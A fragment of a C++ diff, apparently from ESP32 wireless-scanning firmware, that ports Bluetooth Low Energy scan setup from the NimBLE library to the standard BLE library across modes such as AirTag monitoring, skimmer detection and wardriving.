     pAdvertising = pServer->getAdvertising();
 
@@ -4596,7 +4876,9 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
       display_obj.print_delay_2 = 20;
     #endif
 
-    if ((scan_mode == BT_SCAN_FLOCK) ||
+    // FIXME: No such functions in BLE.
+    // Find analogue later.
+    /*if ((scan_mode == BT_SCAN_FLOCK) ||
         (scan_mode == BT_SCAN_FLOCK_WARDRIVE) ||
         (scan_mode == WIFI_SCAN_WAR_DRIVE) ||
         (scan_mode == WIFI_SCAN_DETECT_FOLLOW) ||
@@ -4604,15 +4886,15 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
         (scan_mode == BT_SCAN_SIMPLE_TWO) ||
         (scan_mode == BT_SCAN_ANALYZER) ||
         (scan_mode == BT_SCAN_RAYBAN))
-      NimBLEDevice::setScanDuplicateCacheSize(0);
+      BLEDevice::setScanDuplicateCacheSize(0);
     else {
-      NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
-      NimBLEDevice::setScanDuplicateCacheSize(200);
-    }
+      BLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
+      BLEDevice::setScanDuplicateCacheSize(200);
+    }*/
 
 
-    NimBLEDevice::init("");
-    pBLEScan = NimBLEDevice::getScan(); //create new scan
+    BLEDevice::init("");
+    pBLEScan = BLEDevice::getScan(); //create new scan
     if ((scan_mode == BT_SCAN_ALL) ||
         (scan_mode == BT_SCAN_RAYBAN) ||
         (scan_mode == BT_SCAN_AIRTAG) ||
@@ -4664,7 +4946,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
         display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
       #endif
       if (scan_mode == BT_SCAN_ALL)
-        pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), false);
+        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
 
       else if ((scan_mode == BT_SCAN_FLIPPER) ||
                 (scan_mode == BT_SCAN_RAYBAN) ||
@@ -4679,7 +4961,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
         if ((scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_AIRTAG_MON))
           this->clearList(CLEAR_AT);
 
-        pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), true);
+        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
       }
     }
     else if (scan_mode == BT_SCAN_SKIMMERS) {
@@ -4695,7 +4977,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
         display_obj.tft.setTextColor(TFT_BLACK, TFT_DARKGREY);
       #endif
       
-      pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), false);
+      pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
     }
     else if (scan_mode == BT_SCAN_ANALYZER) {
       #ifdef HAS_SCREEN
@@ -4710,17 +4992,18 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
         display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
       #endif
       
-      pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), false);
+      pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
     }
     else if ((scan_mode == WIFI_SCAN_WAR_DRIVE) ||
             (scan_mode == WIFI_SCAN_DETECT_FOLLOW)) {
       
-      pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), true);
+      pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
     }
     pBLEScan->setActiveScan(true); //active scan uses more power, but get results faster
     pBLEScan->setInterval(100);
     pBLEScan->setWindow(99);  // less or equal setInterval value
-    pBLEScan->setMaxResults(0);
+    // Don't need in BLE library.
+    //pBLEScan->setMaxResults(0);
     if ((scan_mode == BT_SCAN_RAYBAN) ||
         (scan_mode == WIFI_SCAN_WAR_DRIVE) ||
         (scan_mode == BT_SCAN_ANALYZER) ||
@@ -9203,7 +9486,7 @@ void WiFiScan::loop(uint32_t currentTime)
         }
         else {
           if (WiFi.scanComplete() != WIFI_SCAN_RUNNING) {
-            pBLEScan->start(0, false, false); // Scan is in MS
+            pBLEScan->start(0, NULL, false); // Scan is in MS
             this->ble_scanning = true;
             return;
           }
